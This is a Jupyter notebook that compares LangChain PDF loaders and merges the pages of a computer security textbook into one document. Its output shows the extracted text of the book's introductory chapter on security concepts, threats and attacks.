{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Preprocess PDF documents"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Load PDF files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from langchain.document_loaders import PyPDFium2Loader, PyPDFLoader, PDFMinerLoader, UnstructuredPDFLoader"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# filepaths = [\"docs/computer-security-note--section2.1-2.3.pdf\"]\n",
    "# filepaths = [\"docs/computer-security-note--p17.pdf\"]\n",
    "# filepaths = [\"docs/computer-security-note--section2.pdf\"]\n",
    "# filepaths = [\"docs/computer-security-principles-practice-4th-global.pdf\"]\n",
    "filepaths = [\"docs/computer-security-principles-practice-4th-global_part1-2.pdf\"]\n",
    "# filepaths = [\"docs/computer-security-note--section2.1-2.3.pdf\", \"docs/computer-security-note--section2.pdf\", \"docs/computer-security-note.pdf\", \"docs/computer-security-principles-practice-4th-global.pdf\"]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create tempfile copy for streamlit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# import tempfile\n",
    "\n",
    "# tempt_dir = tempfile.TemporaryDirectory()\n",
    "# print(f\"Temporary directory: {tempt_dir.name}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Experiments on different PDF loader"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# loader1 = PyPDFium2Loader(filepaths[0])\n",
    "# data1 = loader1.load()\n",
    "# data1[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# loader2 = PyPDFLoader(filepaths[0])\n",
    "# data2 = loader2.load()\n",
    "# data2[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# loader3 = PDFMinerLoader(filepaths[0])\n",
    "# data3 = loader3.load()\n",
    "# data3[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "# loader4 = UnstructuredPDFLoader(filepaths[0])\n",
    "# data4 = loader4.load()\n",
    "# data4[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "# loader5 = UnstructuredPDFLoader(filepaths[0], mode=\"elements\")\n",
    "# data5 = loader5.load()\n",
    "# data5[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "# len(data1), len(data4)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "# data1[0], data4[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "# len(data1), len(data2), len(data3), len(data4), len(data5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "# data1[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "# data2[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "# data3[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "# data4[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "# data5[:5]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Fastest: langchain.document_loaders.PyPDFium2Loader**\n",
    "\n",
    "**Slowest: langchain.document_loaders.UnstructuredPDFLoader (mode=\"single)**\n",
    "\n",
    "**Best: langchain.document_loaders.UnstructuredPDFLoader (mode=\"single)**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Use PyPDFium2Loader"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing docs/computer-security-principles-practice-4th-global_part1-2.pdf...\n",
      "Loaded 457 pages.\n",
      "Total 1 pages.\n"
     ]
    }
   ],
   "source": [
    "from langchain.docstore.document import Document\n",
    "\n",
    "pdfs = []\n",
    "for filepath in filepaths:\n",
    "    print(f\"Processing {filepath}...\")\n",
    "    loader = PyPDFium2Loader(filepath)\n",
    "    pages = loader.load()\n",
    "    print(f\"Loaded {len(pages)} pages.\")\n",
    "    pages = [page for page in pages if page.page_content]\n",
    "    pages = [Document(page_content=\"\\n\\n\".join([page.page_content for page in pages]), metadata=pages[0].metadata)]\n",
    "    pdfs += pages\n",
    "print(f\"Total {len(pdfs)} pages.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "page_content='23\\r\\n1.1 Computer Security Concepts\\r\\nA Definition of Computer Security\\r\\nExamples\\r\\nThe Challenges of Computer Security\\r\\nA Model for Computer Security\\r\\n1.2 Threats, Attacks, and Assets\\r\\nThreats and Attacks\\r\\nThreats and Assets\\r\\n1.3 Security Functional Requirements\\r\\n1.4 Fundamental Security Design Principles\\r\\n1.5 Attack Surfaces and Attack Trees\\r\\nAttack Surfaces\\r\\nAttack Trees\\r\\n1.6 Computer Security Strategy\\r\\nSecurity Policy\\r\\nSecurity Implementation\\r\\nAssurance and Evaluation\\r\\n1.7 Standards\\r\\n1.8 Key Terms, Review Questions, and Problems\\r\\nOverview\\r\\nCHAPTER\\r\\nM01_STAL0611_04_GE_C01.indd 23 10/10/17 9:22 PM\\n\\n\\n24 CHAPTER 1 / OVERVIEW\\r\\nThis chapter provides an overview of computer security. We begin with a discussion \\r\\nof what we mean by computer security. In essence, computer security deals with \\r\\ncomputer-related assets that are subject to a variety of threats and for which various \\r\\nmeasures are taken to protect those assets. Accordingly, the next section of this \\r\\nchapter provides a brief overview of the categories of computer-related assets that \\r\\nusers and system managers wish to preserve and protect, and a look at the various \\r\\nthreats and attacks that can be made on those assets. Then, we survey the measures \\r\\nthat can be taken to deal with such threats and attacks. This we do from three dif\\ufffeferent viewpoints, in Sections 1.3 through 1.5. We then lay out in general terms a \\r\\ncomputer security strategy.\\r\\nThe focus of this chapter, and indeed this book, is on three fundamental \\r\\nquestions:\\r\\n1. What assets do we need to protect?\\r\\n2. How are those assets threatened?\\r\\n3. What can we do to counter those threats?\\r\\n1.1 COMPUTER SECURITY CONCEPTS\\r\\nA Definition of Computer Security\\r\\nThe NIST Internal/Interagency Report NISTIR 7298 (Glossary of Key Information \\r\\nSecurity Terms, May 2013) defines the term computer security as follows:\\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Describe the key security requirements of confidentiality, integrity, and \\r\\navailability.\\r\\n◆ Discuss the types of security threats and attacks that must be dealt with \\r\\nand give examples of the types of threats and attacks that apply to different \\r\\ncategories of computer and network assets.\\r\\n◆ Summarize the functional requirements for computer security.\\r\\n◆ Explain the fundamental security design principles.\\r\\n◆ Discuss the use of attack surfaces and attack trees.\\r\\n◆ Understand the principle aspects of a comprehensive security strategy.\\r\\nComputer Security: Measures and controls that ensure confidentiality, integrity, \\r\\nand availability of information system assets including hardware, software, firm\\ufffeware, and information being processed, stored, and communicated.\\r\\nM01_STAL0611_04_GE_C01.indd 24 10/10/17 9:22 PM\\n\\n\\n1.1 / COMPUTER SECURITY CONCEPTS 25\\r\\nThis definition introduces three key objectives that are at the heart of computer \\r\\nsecurity:\\r\\n• Confidentiality: This term covers two related concepts:\\r\\n— Data confidentiality:1\\r\\n Assures that private or confidential information is \\r\\nnot made available or disclosed to unauthorized individuals.\\r\\n— Privacy: Assures that individuals control or influence what information \\r\\nrelated to them may be collected and stored and by whom and to whom that \\r\\ninformation may be disclosed.\\r\\n• Integrity: This term covers two related concepts:\\r\\n— Data integrity: Assures that information and programs are changed only \\r\\nin a specified and authorized manner.\\r\\n— System integrity: Assures that a system performs its intended function in \\r\\nan unimpaired manner, free from deliberate or inadvertent unauthorized \\r\\nmanipulation of the system.\\r\\n• Availability: Assures that systems work promptly and service is not denied to \\r\\nauthorized users.\\r\\nThese three concepts form what is often referred to as the CIA triad. The three \\r\\nconcepts embody the fundamental security objectives for both data and for information \\r\\nand computing services. For example, the NIST standard FIPS 199 (Standards for Security \\r\\nCategorization of Federal Information and Information Systems, February 2004) lists con\\ufffefidentiality, integrity, and availability as the three security objectives for information and \\r\\nfor information systems. FIPS 199 provides a useful characterization of these three objec\\ufffetives in terms of requirements and the definition of a loss of security in each category:\\r\\n• Confidentiality: Preserving authorized restrictions on information access and \\r\\ndisclosure, including means for protecting personal privacy and proprietary infor\\ufffemation. A loss of confidentiality is the unauthorized disclosure of information.\\r\\n• Integrity: Guarding against improper information modification or destruction, \\r\\nincluding ensuring information nonrepudiation and authenticity. A loss of integ\\uffferity is the unauthorized modification or destruction of information.\\r\\n• Availability: Ensuring timely and reliable access to and use of information. \\r\\nA loss of availability is the disruption of access to or use of information or an \\r\\ninformation system.\\r\\nAlthough the use of the CIA triad to define security objectives is well estab\\ufffelished, some in the security field feel that additional concepts are needed to present a \\r\\ncomplete picture (see Figure 1.1). Two of the most commonly mentioned are as follows:\\r\\n• Authenticity: The property of being genuine and being able to be verified and \\r\\ntrusted; confidence in the validity of a transmission, a message, or message \\r\\n1\\r\\nRFC 4949 (Internet Security Glossary, August 2007) defines information as “facts and ideas, which can \\r\\nbe represented (encoded) as various forms of data,” and data as “information in a specific physical rep\\uffferesentation, usually a sequence of symbols that have meaning; especially a representation of information \\r\\nthat can be processed or produced by a computer.” Security literature typically does not make much of a \\r\\ndistinction; nor does this book.\\r\\nM01_STAL0611_04_GE_C01.indd 25 10/10/17 9:22 PM\\n\\n\\n26 CHAPTER 1 / OVERVIEW\\r\\noriginator. This means verifying that users are who they say they are and that \\r\\neach input arriving at the system came from a trusted source.\\r\\n• Accountability: The security goal that generates the requirement for actions \\r\\nof an entity to be traced uniquely to that entity. This supports nonrepudiation, \\r\\ndeterrence, fault isolation, intrusion detection and prevention, and after-action \\r\\nrecovery and legal action. Because truly secure systems are not yet an achiev\\ufffeable goal, we must be able to trace a security breach to a responsible party. \\r\\nSystems must keep records of their activities to permit later forensic analysis \\r\\nto trace security breaches or to aid in transaction disputes.\\r\\nNote that FIPS 199 includes authenticity under integrity.\\r\\nExamples\\r\\nWe now provide some examples of applications that illustrate the requirements just \\r\\nenumerated.2\\r\\n For these examples, we use three levels of impact on organizations or \\r\\nindividuals should there be a breach of security (i.e., a loss of confidentiality, integrity, \\r\\nor availability). These levels are defined in FIPS 199:\\r\\n• Low: The loss could be expected to have a limited adverse effect on organiza\\ufffetional operations, organizational assets, or individuals. A limited adverse effect \\r\\nmeans that, for example, the loss of confidentiality, integrity, or availability \\r\\nmight: (i) cause a degradation in mission capability to an extent and duration \\r\\nthat the organization is able to perform its primary functions, but the effec\\ufffetiveness of the functions is noticeably reduced; (ii) result in minor damage to \\r\\norganizational assets; (iii) result in minor financial loss; or (iv) result in minor \\r\\nharm to individuals.\\r\\n2\\r\\nThese examples are taken from a security policy document published by the Information Technology \\r\\nSecurity and Privacy Office at Purdue University.\\r\\nFigure 1.1 Essential Network and \\r\\nComputer Security Requirements\\r\\nData\\r\\nand\\r\\nservices\\r\\nAvailability\\r\\nIntegrity\\r\\nAccountability\\r\\nAuthenticity\\r\\nConfidentiality\\r\\nM01_STAL0611_04_GE_C01.indd 26 10/10/17 9:22 PM\\n\\n\\n1.1 / COMPUTER SECURITY CONCEPTS 27\\r\\n• Moderate: The loss could be expected to have a serious adverse effect on \\r\\norganizational operations, organizational assets, or individuals. A serious \\r\\nadverse effect means that, for example, the loss might: (i) cause a significant \\r\\ndegradation in mission capability to an extent and duration that the organiza\\ufffetion is able to perform its primary functions, but the effectiveness of the func\\ufffetions is significantly reduced; (ii) result in significant damage to organizational \\r\\nassets; (iii) result in significant financial loss; or (iv) result in significant harm to \\r\\nindividuals that does not involve loss of life or serious life-threatening injuries.\\r\\n• High:The loss could be expected to have a severe or catastrophic adverse effect \\r\\non organizational operations, organizational assets, or individuals. A severe or \\r\\ncatastrophic adverse effect means that, for example, the loss might: (i) cause a \\r\\nsevere degradation in or loss of mission capability to an extent and duration \\r\\nthat the organization is not able to perform one or more of its primary func\\ufffetions; (ii) result in major damage to organizational assets; (iii) result in major \\r\\nfinancial loss; or (iv) result in severe or catastrophic harm to individuals involv\\ufffeing loss of life or serious life-threatening injuries.\\r\\nCONFIDENTIALITY Student grade information is an asset whose confidentiality is\\r\\nconsidered to be highly important by students. In the United States, the release of \\r\\nsuch information is regulated by the Family Educational Rights and Privacy Act \\r\\n(FERPA). Grade information should only be available to students, their parents, and \\r\\nemployees that require the information to do their job. Student enrollment informa\\ufffetion may have a moderate confidentiality rating. While still covered by FERPA, this \\r\\ninformation is seen by more people on a daily basis, is less likely to be targeted than \\r\\ngrade information, and results in less damage if disclosed. Directory information, such \\r\\nas lists of students or faculty or departmental lists, may be assigned a low confiden\\ufffetiality rating or indeed no rating. This information is typically freely available to the \\r\\npublic and published on a school’s website.\\r\\nINTEGRITY Several aspects of integrity are illustrated by the example of a hospital \\r\\npatient’s allergy information stored in a database. The doctor should be able to trust \\r\\nthat the information is correct and current. Now, suppose an employee (e.g., a nurse) \\r\\nwho is authorized to view and update this information deliberately falsifies the data \\r\\nto cause harm to the hospital. The database needs to be restored to a trusted basis \\r\\nquickly, and it should be possible to trace the error back to the person responsible. \\r\\nPatient allergy information is an example of an asset with a high requirement for \\r\\nintegrity. Inaccurate information could result in serious harm or death to a patient, \\r\\nand expose the hospital to massive liability.\\r\\nAn example of an asset that may be assigned a moderate level of integrity \\r\\nrequirement is a website that offers a forum to registered users to discuss some spe\\ufffecific topic. Either a registered user or a hacker could falsify some entries or deface the \\r\\nwebsite. If the forum exists only for the enjoyment of the users, brings in little or no \\r\\nadvertising revenue, and is not used for something important such as research, then \\r\\npotential damage is not severe. The Webmaster may experience some data, financial, \\r\\nand time loss.\\r\\nAn example of a low integrity requirement is an anonymous online poll. Many \\r\\nwebsites, such as news organizations, offer these polls to their users with very few \\r\\nM01_STAL0611_04_GE_C01.indd 27 10/10/17 9:22 PM\\n\\n\\n28 CHAPTER 1 / OVERVIEW\\r\\nsafeguards. However, the inaccuracy and unscientific nature of such polls is well \\r\\nunderstood.\\r\\nAVAILABILITY The more critical a component or service is, the higher will be the \\r\\nlevel of availability required. Consider a system that provides authentication services \\r\\nfor critical systems, applications, and devices. An interruption of service results in the \\r\\ninability for customers to access computing resources and staff to access the resources \\r\\nthey need to perform critical tasks. The loss of the service translates into a large \\r\\nfinancial loss in lost employee productivity and potential customer loss.\\r\\nAn example of an asset that would typically be rated as having a moderate \\r\\navailability requirement is a public website for a university; the website provides \\r\\ninformation for current and prospective students and donors. Such a site is not a \\r\\ncritical component of the university’s information system, but its unavailability will \\r\\ncause some embarrassment.\\r\\nAn online telephone directory lookup application would be classified as a low \\r\\navailability requirement. Although the temporary loss of the application may be an \\r\\nannoyance, there are other ways to access the information, such as a hardcopy direc\\ufffetory or the operator.\\r\\nThe Challenges of Computer Security\\r\\nComputer security is both fascinating and complex. Some of the reasons are as follows:\\r\\n1. Computer security is not as simple as it might first appear to the novice. The \\r\\nrequirements seem to be straightforward; indeed, most of the major require\\ufffements for security services can be given self-explanatory one-word labels: \\r\\nconfidentiality, authentication, nonrepudiation, and integrity. But the mecha\\ufffenisms used to meet those requirements can be quite complex, and understanding \\r\\nthem may involve rather subtle reasoning.\\r\\n2. In developing a particular security mechanism or algorithm, one must always con\\ufffesider potential attacks on those security features. In many cases, successful attacks \\r\\nare designed by looking at the problem in a completely different way, therefore \\r\\nexploiting an unexpected weakness in the mechanism.\\r\\n3. Because of Point 2, the procedures used to provide particular services are often \\r\\ncounterintuitive. Typically, a security mechanism is complex, and it is not obvious \\r\\nfrom the statement of a particular requirement that such elaborate measures are \\r\\nneeded. Only when the various aspects of the threat are considered do elaborate \\r\\nsecurity mechanisms make sense.\\r\\n4. Having designed various security mechanisms, it is necessary to decide where to \\r\\nuse them. This is true both in terms of physical placement (e.g., at what points in \\r\\na network are certain security mechanisms needed) and in a logical sense [e.g., \\r\\nat what layer or layers of an architecture such as TCP/IP (Transmission Control \\r\\nProtocol/Internet Protocol) should mechanisms be placed].\\r\\n5. Security mechanisms typically involve more than a particular algorithm or \\r\\nprotocol. They also require that participants be in possession of some secret \\r\\ninformation (e.g., an encryption key), which raises questions about the creation, \\r\\ndistribution, and protection of that secret information. There may also be a reli\\ufffeance on communications protocols whose behavior may complicate the task of \\r\\nM01_STAL0611_04_GE_C01.indd 28 10/10/17 9:22 PM\\n\\n\\n1.1 / COMPUTER SECURITY CONCEPTS 29\\r\\ndeveloping the security mechanism. For example, if the proper functioning of the \\r\\nsecurity mechanism requires setting time limits on the transit time of a message \\r\\nfrom sender to receiver, then any protocol or network that introduces variable, \\r\\nunpredictable delays may render such time limits meaningless.\\r\\n6. Computer security is essentially a battle of wits between a perpetrator who tries \\r\\nto find holes, and the designer or administrator who tries to close them. The great \\r\\nadvantage that the attacker has is that he or she need only find a single weak\\ufffeness, while the designer must find and eliminate all weaknesses to achieve perfect \\r\\nsecurity.\\r\\n7. There is a natural tendency on the part of users and system managers to perceive \\r\\nlittle benefit from security investment until a security failure occurs.\\r\\n8. Security requires regular, even constant monitoring, and this is difficult in today’s \\r\\nshort-term, overloaded environment.\\r\\n9. Security is still too often an afterthought to be incorporated into a system after\\r\\nthe design is complete, rather than being an integral part of the design process.\\r\\n10. Many users and even security administrators view strong security as an impedi\\ufffement to efficient and user-friendly operation of an information system or use \\r\\nof information.\\r\\nThe difficulties just enumerated will be encountered in numerous ways as we \\r\\nexamine the various security threats and mechanisms throughout this book.\\r\\nA Model for Computer Security\\r\\nWe now introduce some terminology that will be useful throughout the book.3 Table \\r\\n1.1 defines terms and Figure 1.2, based on [CCPS12a], shows the relationship among \\r\\nsome of these terms. We start with the concept of a system resource or asset, that \\r\\nusers and owners wish to protect. The assets of a computer system can be categorized \\r\\nas follows:\\r\\n• Hardware: Including computer systems and other data processing, data storage, \\r\\nand data communications devices.\\r\\n• Software: Including the operating system, system utilities, and applications.\\r\\n• Data: Including files and databases, as well as security-related data, such as \\r\\npassword files.\\r\\n• Communication facilities and networks: Local and wide area network com\\ufffemunication links, bridges, routers, and so on.\\r\\nIn the context of security, our concern is with the vulnerabilities of system \\r\\nresources. [NRC02] lists the following general categories of vulnerabilities of a com\\ufffeputer system or network asset:\\r\\n• The system can be corrupted, so it does the wrong thing or gives wrong answers. \\r\\nFor example, stored data values may differ from what they should be because \\r\\nthey have been improperly modified.\\r\\n3\\r\\nSee Chapter 0 for an explanation of RFCs.\\r\\nM01_STAL0611_04_GE_C01.indd 29 10/10/17 9:22 PM\\n\\n\\n30 CHAPTER 1 / OVERVIEW\\r\\nFigure 1.2 Security Concepts and Relationships\\r\\nAssets\\r\\nThreats\\r\\nThreat agents\\r\\nWish to \\r\\nminimize\\r\\nWish to abuse\\r\\nand/or\\r\\nmay damage\\r\\nTo To\\r\\nThat\\r\\nincrease\\r\\nGive\\r\\nrise to\\r\\nOwners\\r\\nCountermeasures\\r\\nRisk\\r\\nImpose\\r\\nValue\\r\\nTo\\r\\nreduce\\r\\nAdversary (threat agent)\\r\\nIndividual, group, organization, or government that conducts or has the intent to conduct detrimental activities.\\r\\nAttack\\r\\nAny kind of malicious activity that attempts to collect, disrupt, deny, degrade, or destroy information system \\r\\nresources or the information itself.\\r\\nCountermeasure\\r\\nA device or techniques that has as its objective the impairment of the operational effectiveness of undesirable \\r\\nor adversarial activity, or the prevention of espionage, sabotage, theft, or unauthorized access to or use of \\r\\nsensitive information or information systems.\\r\\nRisk\\r\\nA measure of the extent to which an entity is threatened by a potential circumstance or event, and typically a function \\r\\nof 1) the adverse impacts that would arise if the circumstance or event occurs; and 2) the likelihood of occurrence.\\r\\nSecurity Policy\\r\\nA set of criteria for the provision of security services. It defines and constrains the activities of a data process\\ufffeing facility in order to maintain a condition of security for systems and data.\\r\\nSystem Resource (Asset)\\r\\nA major application, general support system, high impact program, physical plant, mission critical system, per\\ufffesonnel, equipment, or a logically related group of systems.\\r\\nThreat\\r\\nAny circumstance or event with the potential to adversely impact organizational operations (including mission, func\\ufffetions, image, or reputation), organizational assets, individuals, other organizations, or the Nation through an informa\\ufffetion system via unauthorized access, destruction, disclosure, modification of information, and/or denial of service.\\r\\nVulnerability\\r\\nWeakness in an information system, system security procedures, internal controls, or implementation that \\r\\ncould be exploited or triggered by a threat source.\\r\\nSource: Stallings, William, Computer Security: Principles and Practice, 4e., ©2019. Reprinted and electronically \\r\\nreproduced by permission of pearson education, inc., new york, ny.\\r\\nTable 1.1 Computer Security Terminology\\r\\n• The system can become leaky. For example, someone who should not have \\r\\naccess to some or all of the information available through the network obtains \\r\\nsuch access.\\r\\n• The system can become unavailable or very slow. That is, using the system or \\r\\nnetwork becomes impossible or impractical.\\r\\nM01_STAL0611_04_GE_C01.indd 30 10/10/17 9:22 PM\\n\\n\\n1.2 / THREATS, ATTACKS, AND ASSETS 31\\r\\nThese three general types of vulnerability correspond to the concepts of integrity, \\r\\nconfidentiality, and availability, enumerated earlier in this section.\\r\\nCorresponding to the various types of vulnerabilities to a system resource are \\r\\nthreats that are capable of exploiting those vulnerabilities. A threat represents a \\r\\npotential security harm to an asset. An attack is a threat that is carried out (threat \\r\\naction) and, if successful, leads to an undesirable violation of security, or threat con\\ufffesequence. The agent carrying out the attack is referred to as an attacker or threat \\r\\nagent. We can distinguish two types of attacks:\\r\\n• Active attack: An attempt to alter system resources or affect their operation.\\r\\n• Passive attack: An attempt to learn or make use of information from the system \\r\\nthat does not affect system resources.\\r\\nWe can also classify attacks based on the origin of the attack:\\r\\n• Inside attack: Initiated by an entity inside the security perimeter (an “insider”). \\r\\nThe insider is authorized to access system resources but uses them in a way not \\r\\napproved by those who granted the authorization.\\r\\n• Outside attack: Initiated from outside the perimeter, by an unauthorized or ille\\ufffegitimate user of the system (an “outsider”). On the Internet, potential outside \\r\\nattackers range from amateur pranksters to organized criminals, international \\r\\nterrorists, and hostile governments.\\r\\nFinally, a countermeasure is any means taken to deal with a security attack. \\r\\nIdeally, a countermeasure can be devised to prevent a particular type of attack from \\r\\nsucceeding. When prevention is not possible, or fails in some instance, the goal is to \\r\\ndetect the attack then recover from the effects of the attack. A countermeasure may \\r\\nitself introduce new vulnerabilities. In any case, residual vulnerabilities may remain \\r\\nafter the imposition of countermeasures. Such vulnerabilities may be exploited by \\r\\nthreat agents representing a residual level of risk to the assets. Owners will seek to \\r\\nminimize that risk given other constraints.\\r\\n1.2 THREATS, ATTACKS, AND ASSETS\\r\\nWe now turn to a more detailed look at threats, attacks, and assets. First, we look at \\r\\nthe types of security threats that must be dealt with, and then give some examples of \\r\\nthe types of threats that apply to different categories of assets.\\r\\nThreats and Attacks\\r\\nTable 1.2, based on RFC 4949, describes four kinds of threat consequences and lists \\r\\nthe kinds of attacks that result in each consequence.\\r\\nUnauthorized disclosure is a threat to confidentiality. The following types of \\r\\nattacks can result in this threat consequence:\\r\\n• Exposure: This can be deliberate, as when an insider intentionally releases sen\\ufffesitive information, such as credit card numbers, to an outsider. It can also be \\r\\nthe result of a human, hardware, or software error, which results in an entity \\r\\ngaining unauthorized knowledge of sensitive data. There have been numerous \\r\\nM01_STAL0611_04_GE_C01.indd 31 10/10/17 9:22 PM\\n\\n\\n32 CHAPTER 1 / OVERVIEW\\r\\nThreat Consequence Threat Action (Attack)\\r\\nUnauthorized Disclosure\\r\\nA circumstance or event whereby \\r\\nan entity gains access to data for \\r\\nwhich the entity is not authorized.\\r\\nExposure: Sensitive data are directly released to an unauthorized \\r\\nentity.\\r\\nInterception: An unauthorized entity directly accesses sensitive \\r\\ndata traveling between authorized sources and destinations.\\r\\nInference: A threat action whereby an unauthorized entity \\r\\nindirectly accesses sensitive data (but not necessarily the \\r\\ndata contained in the communication) by reasoning from \\r\\ncharacteristics or by-products of communications.\\r\\nIntrusion: An unauthorized entity gains access to sensitive data \\r\\nby circumventing a system’s security protections.\\r\\nDeception\\r\\nA circumstance or event that \\r\\nmay result in an authorized entity \\r\\nreceiving false data and believing it \\r\\nto be true.\\r\\nMasquerade: An unauthorized entity gains access to a system or \\r\\nperforms a malicious act by posing as an authorized entity.\\r\\nFalsification: False data deceive an authorized entity.\\r\\nRepudiation: An entity deceives another by falsely denying \\r\\nresponsibility for an act.\\r\\nDisruption\\r\\nA circumstance or event that \\r\\ninterrupts or prevents the correct \\r\\noperation of system services and \\r\\nfunctions.\\r\\nIncapacitation: Prevents or interrupts system operation by \\r\\ndisabling a system component.\\r\\nCorruption: Undesirably alters system operation by adversely \\r\\nmodifying system functions or data.\\r\\nObstruction: A threat action that interrupts delivery of system \\r\\nservices by hindering system operation.\\r\\nUsurpation\\r\\nA circumstance or event that results \\r\\nin control of system services or \\r\\nfunctions by an unauthorized entity.\\r\\nMisappropriation: An entity assumes unauthorized logical or \\r\\nphysical control of a system resource.\\r\\nMisuse: Causes a system component to perform a function or \\r\\nservice that is detrimental to system security.\\r\\nSource: Based on RFC 4949\\r\\nTable 1.2 Threat Consequences, and the Types of Threat Actions that Cause Each Consequence\\r\\ninstances of this, such as universities accidentally posting confidential student \\r\\ninformation on the Web.\\r\\n• Interception: Interception is a common attack in the context of communica\\ufffetions. On a shared local area network (LAN), such as a wireless LAN or a \\r\\nbroadcast Ethernet, any device attached to the LAN can receive a copy of \\r\\npackets intended for another device. On the Internet, a determined hacker can \\r\\ngain access to e-mail traffic and other data transfers. All of these situations cre\\ufffeate the potential for unauthorized access to data.\\r\\n• Inference: An example of inference is known as traffic analysis, in which an \\r\\nadversary is able to gain information from observing the pattern of traffic on \\r\\na network, such as the amount of traffic between particular pairs of hosts on \\r\\nthe network. Another example is the inference of detailed information from a \\r\\ndatabase by a user who has only limited access; this is accomplished by repeated \\r\\nqueries whose combined results enable inference.\\r\\n• Intrusion: An example of intrusion is an adversary gaining unauthorized access \\r\\nto sensitive data by overcoming the system’s access control protections.\\r\\nM01_STAL0611_04_GE_C01.indd 32 10/10/17 9:22 PM\\n\\n\\n1.2 / THREATS, ATTACKS, AND ASSETS 33\\r\\nDeception is a threat to either system integrity or data integrity. The following \\r\\ntypes of attacks can result in this threat consequence:\\r\\n• Masquerade: One example of masquerade is an attempt by an unauthorized \\r\\nuser to gain access to a system by posing as an authorized user; this could hap\\ufffepen if the unauthorized user has learned another user’s logon ID and password. \\r\\nAnother example is malicious logic, such as a Trojan horse, that appears to \\r\\nperform a useful or desirable function but actually gains unauthorized access \\r\\nto system resources, or tricks a user into executing other malicious logic.\\r\\n• Falsification: This refers to the altering or replacing of valid data or the intro\\ufffeduction of false data into a file or database. For example, a student may alter \\r\\nhis or her grades on a school database.\\r\\n• Repudiation: In this case, a user either denies sending data, or a user denies \\r\\nreceiving or possessing the data.\\r\\nDisruption is a threat to availability or system integrity. The following types of \\r\\nattacks can result in this threat consequence:\\r\\n• Incapacitation: This is an attack on system availability. This could occur as a \\r\\nresult of physical destruction of or damage to system hardware. More typically, \\r\\nmalicious software, such as Trojan horses, viruses, or worms, could operate in \\r\\nsuch a way as to disable a system or some of its services.\\r\\n• Corruption: This is an attack on system integrity. Malicious software in this \\r\\ncontext could operate in such a way that system resources or services function \\r\\nin an unintended manner. Or a user could gain unauthorized access to a system \\r\\nand modify some of its functions. An example of the latter is a user placing \\r\\nbackdoor logic in the system to provide subsequent access to a system and its \\r\\nresources by other than the usual procedure.\\r\\n• Obstruction: One way to obstruct system operation is to interfere with commu\\ufffenications by disabling communication links or altering communication control \\r\\ninformation. Another way is to overload the system by placing excess burden \\r\\non communication traffic or processing resources.\\r\\nUsurpation is a threat to system integrity. The following types of attacks can \\r\\nresult in this threat consequence:\\r\\n• Misappropriation: This can include theft of service. An example is a distributed \\r\\ndenial of service attack, when malicious software is installed on a number of hosts \\r\\nto be used as platforms to launch traffic at a target host. In this case, the malicious \\r\\nsoftware makes unauthorized use of processor and operating system resources.\\r\\n• Misuse: Misuse can occur by means of either malicious logic or a hacker that \\r\\nhas gained unauthorized access to a system. In either case, security functions \\r\\ncan be disabled or thwarted.\\r\\nThreats and Assets\\r\\nThe assets of a computer system can be categorized as hardware, software, data, and \\r\\ncommunication lines and networks. In this subsection, we briefly describe these four \\r\\nM01_STAL0611_04_GE_C01.indd 33 10/10/17 9:22 PM\\n\\n\\n34 CHAPTER 1 / OVERVIEW\\r\\ncategories and relate these to the concepts of integrity, confidentiality, and availability \\r\\nintroduced in Section 1.1 (see Figure 1.3 and Table 1.3).\\r\\nHARDWARE A major threat to computer system hardware is the threat to availabil\\ufffeity. Hardware is the most vulnerable to attack and the least susceptible to automated \\r\\ncontrols. Threats include accidental and deliberate damage to equipment as well as \\r\\ntheft. The proliferation of personal computers and workstations and the widespread \\r\\nuse of LANs increase the potential for losses in this area. Theft of USB drives can \\r\\nlead to loss of confidentiality. Physical and administrative security measures are \\r\\nneeded to deal with these threats.\\r\\nSOFTWARE Software includes the operating system, utilities, and application pro\\ufffegrams. A key threat to software is an attack on availability. Software, especially \\r\\napplication software, is often easy to delete. Software can also be altered or damaged \\r\\nto render it useless. Careful software configuration management, which 